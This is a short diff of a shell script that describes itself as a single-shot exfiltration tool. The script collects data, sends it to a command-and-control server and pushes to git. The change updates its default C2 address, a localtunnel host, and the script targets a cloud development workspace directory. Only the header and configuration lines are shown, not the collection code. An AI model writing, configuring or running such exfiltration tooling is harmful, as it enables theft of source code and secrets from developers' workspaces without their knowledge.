@@ -4,7 +4,7 @@
 # Single-shot exfil: collects data, sends to C2, pushes git, exits cleanly.
 # =============================================================================
 
-C2_URL="${C2_URL:-https://kappexpoc3.loca.lt}"
+C2_URL="${C2_URL:-https://kappexpoc4.loca.lt}"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
